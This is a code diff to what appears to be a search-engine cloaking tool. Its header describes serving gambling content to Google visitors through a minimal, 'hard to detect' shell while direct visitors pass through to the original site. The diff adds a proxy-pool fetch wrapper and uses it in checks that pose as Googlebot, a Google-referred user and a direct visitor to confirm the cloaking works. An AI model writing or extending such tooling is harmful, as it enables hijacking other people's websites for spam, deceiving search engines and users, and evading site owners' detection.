@@ -8,7 +8,21 @@
  * 3. Direct visitors → transparent passthrough to original website
  * 4. All gambling content hosted on external CDN — shell stays minimal & hard to detect
  */
+import { fetchWithPoolProxy } from "./proxy-pool";
 import { invokeLLM } from "./_core/llm";
+
+// Helper: wrap fetch with proxy pool
+async function cloakFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+    return response;
+  } catch (e) {
+    // Fallback to direct fetch if proxy fails
+    return fetch(url, init);
+  }
+}
+
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -807,7 +821,7 @@ export async function verifyCloaking(
 
   try {
     // Test 1: Googlebot UA
-    const botRes = await fetch(targetUrl, {
+    const botRes = await cloakFetch(targetUrl, {
       headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
       redirect: "manual",
     });
@@ -821,7 +835,7 @@ export async function verifyCloaking(
 
   try {
     // Test 2: User from Google
-    const userRes = await fetch(targetUrl, {
+    const userRes = await cloakFetch(targetUrl, {
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Referer": "https://www.google.com/search?q=test",
@@ -843,7 +857,7 @@ export async function verifyCloaking(
 
   try {
     // Test 3: Direct visitor
-    const directRes = await fetch(targetUrl, {
+    const directRes = await cloakFetch(targetUrl, {
       headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
       redirect: "manual",
     });
